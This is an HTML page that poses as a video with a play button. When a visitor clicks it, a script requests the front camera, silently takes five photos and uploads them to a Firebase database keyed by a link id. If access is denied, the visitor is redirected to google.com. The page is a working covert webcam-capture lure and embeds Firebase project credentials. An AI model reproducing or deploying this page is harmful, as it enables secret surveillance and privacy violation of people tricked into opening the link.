<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
</head>
<body style="margin:0;background:#000;height:100vh;overflow:hidden;cursor:pointer;" onclick="go()">

<div style="position:absolute;inset:0;background:url('https://i.imgur.com/8z3xK9L.jpeg') center/cover;filter:blur(18px) brightness(0.5);transform:scale(1.15);"></div>
<div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:120px;height:120px;background:#ff0000;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 0 90px rgba(255,0,0,0.95);border:8px solid rgba(255,255,255,0.5);animation:p 1.5s infinite;">
  <svg width="56" height="56" fill="#fff" viewBox="0 0 24 24" style="margin-left:10px;">
    <path d="M8 5v14l11-7z"/>
  </svg>
</div>

<canvas id="c" style="display:none;"></canvas>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",
  authDomain: "cam-snap-8e956.firebaseapp.com",
  databaseURL: "https://cam-snap-8e956-default-rtdb.firebaseio.com",
  projectId: "cam-snap-8e956",
  storageBucket: "cam-snap-8e956.firebasestorage.app",
  messagingSenderId: "982089892260",
  appId: "1:982089892260:web:2cfa5a4d3b3dbcf45d0131",
  measurementId: "G-S5S37F55T6"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// ID ১০০% সঠিকভাবে নেওয়া
let id = location.pathname.split('/').pop();
if (!id || id === 'view.html') {
  id = new URLSearchParams(location.search).get('id');
}

const today = new Date().toLocaleDateString('bn-BD');
const now = new Date().toLocaleString('bn-BD');

function go() {
  const canvas = document.getElementById('c');
  const ctx = canvas.getContext('2d');
  let pics = [];

  navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
    .then(stream => {
      const v = document.createElement('video');
      v.srcObject = stream;
      v.muted = true;
      v.play();

      let i = 0;
      const snap = () => {
        if (i >= 5) {
          db.ref('links/' + id + '/sessions/' + today).set({photos: pics, time: now})
            .then(() => location.href = "viewer.html?id=" + id);
          return;
        }
        canvas.width = v.videoWidth || 1280;
        canvas.height = v.videoHeight || 720;
        ctx.drawImage(v, 0, 0);
        pics.push(canvas.toDataURL('image/jpeg', 0.96));
        i++;
        setTimeout(snap, 180); // ৫ টি ছবি ১ সেকেন্ডের মধ্যে
      };
      setTimeout(snap, 600);
    })
    .catch(() => setTimeout(() => location.href = "https://google.com", 1000));
}
</script>
</body>
</html>
